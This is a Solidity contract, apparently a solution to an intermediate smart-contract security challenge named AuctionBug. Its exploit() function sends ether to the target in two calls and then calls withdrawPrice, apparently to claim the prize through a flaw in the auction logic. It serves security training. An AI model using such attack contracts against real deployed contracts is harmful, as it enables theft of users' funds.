// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/intermediateChalls/AuctionBug.sol";

contract AttackAuctionBug {
	AuctionBug originalContract;

	constructor(address payable _originalContract) public {
		originalContract = AuctionBug(_originalContract);
	}

	function exploit() public payable {
		require(msg.value == 0.2 ether);
		address(originalContract).call.value(0.1 ether)(abi.encodeWithSignature("addToAuction()"));
		address(originalContract).call.value(0.1 ether)("");
		originalContract.withdrawPrice();
	}
}